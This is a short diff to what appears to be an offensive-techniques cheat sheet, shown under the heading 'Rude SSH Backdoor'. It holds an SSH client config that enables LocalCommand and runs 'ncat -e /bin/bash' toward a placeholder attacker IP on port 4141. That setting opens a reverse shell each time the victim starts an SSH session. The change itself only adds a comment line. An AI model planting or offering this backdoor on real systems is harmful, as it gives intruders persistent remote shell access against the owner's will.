@@ -50,8 +50,11 @@ Commands:
 
 # Rude SSH Backdoor
 ```
+#cat ~/ssh/config
+
 Hostname *
 	PermitLocalCommand true
 	Localcommand ncat -e /bin/bash <MYIP> 4141 &
+
 ```
 
